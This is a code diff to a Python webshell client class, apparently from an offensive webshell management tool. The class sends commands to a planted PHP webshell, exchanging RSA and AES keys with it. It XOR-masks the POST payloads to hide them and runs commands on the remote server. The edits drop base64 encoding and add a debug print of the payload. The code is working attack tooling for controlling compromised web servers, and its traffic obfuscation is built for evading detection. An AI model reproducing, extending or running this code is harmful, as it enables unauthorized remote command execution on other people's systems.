@@ -138,7 +138,7 @@ class PHPWebshellEtherGhostOpen(PHPWebshellCommunication, PHPWebshellActions):
 
     async def communicate_aes_key(self):
         pubkey, _ = get_rsa_key()
-        _, result = await self.submit_obfs("set", base64.b64encode(pubkey))
+        _, result = await self.submit_obfs("set", (pubkey))
         if result == "WRONG_NO_OPENSSL":
             raise exceptions.TargetRuntimeError("目标不支持OpenSSL")
         if result == "WRONG_NO_OPENSSL_FUNCTION":
@@ -154,11 +154,9 @@ class PHPWebshellEtherGhostOpen(PHPWebshellCommunication, PHPWebshellActions):
         # TODO: check encoding here, windows use gbk
         if isinstance(payload, str):
             payload = payload.encode("utf-8")
-        payload_enc = base64.b64encode(
-            encrypt_aes256_cbc(self.key, payload)
-        )
+        payload_enc = encrypt_aes256_cbc(self.key, payload)
         status_code, result_enc = await self.submit_obfs("run", payload_enc)
-        result = decrypt_aes256_cbc(self.key, base64.b64decode(result_enc))
+        result = decrypt_aes256_cbc(self.key, result_enc)
         return status_code, result.decode("utf-8")
 
     async def submit_obfs(self, action: str, data: bytes) -> t.Union[int, bytes]:
@@ -166,7 +164,7 @@ class PHPWebshellEtherGhostOpen(PHPWebshellCommunication, PHPWebshellActions):
 
         k = random.randbytes(8)
         k_repeated = k * (len(call) // 8 + 1)
-        masked = strxor(call, k_repeated[:len(call)])
+        masked = strxor(call, k_repeated[: len(call)])
         raw_data = self.start_mask + k + masked + self.stop_mask
 
         status_code, response = await self.submit_raw(raw_data)
@@ -176,6 +174,7 @@ class PHPWebshellEtherGhostOpen(PHPWebshellCommunication, PHPWebshellActions):
         )
 
     async def submit_raw(self, payload: bytes) -> t.Union[int, bytes]:
+        print(f"{len(payload)=} {payload=}")
         try:
             response = await self.client.request(
                 method="POST", url=self.url, content=payload
